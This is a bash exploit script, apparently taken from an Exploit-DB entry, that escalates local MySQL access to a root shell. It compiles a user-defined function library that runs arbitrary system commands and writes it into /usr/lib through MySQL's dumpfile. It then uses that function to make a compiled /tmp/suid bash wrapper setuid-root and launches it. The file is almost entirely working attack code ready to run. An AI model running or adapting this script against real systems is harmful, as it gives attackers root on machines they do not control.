#!/bin/bash
# mysql_udf exploit with 1 hit
# @404death
# Exploit-db : https://www.exploit-db.com/exploits/1518

cat <<EOF > udf2.c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}
EOF
gcc -g -c udf2.c

gcc -g -shared -Wl,-soname,udf2.so -o udf2.so udf2.o -lc

cat <<EOF > suid.c
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}
EOF
gcc suid.c -o /tmp/suid
cat <<EOF > priv.sql
use mysql;
create table aoo(line blob);
insert into aoo values(load_file('/home/j0hn/udf2.so'));
select * from aoo into dumpfile '/usr/lib/udf2.so';
create function do_system returns integer soname 'udf2.so';
#select * from mysql.func;
EOF
mysql -u root < priv.sql >/dev/null 2>&1
echo "[+] pwned !!!"
cat <<EOF > suid.sql
#select do_system('gcc /home/j0hn/suid.c -o /tmp/suid');
select do_system('chown root:root /tmp/suid && chmod u+s /tmp/suid');
EOF
mysql -u root < suid.sql >/dev/null 2>&1
echo "[+] uid(0) !!!"
/tmp/suid
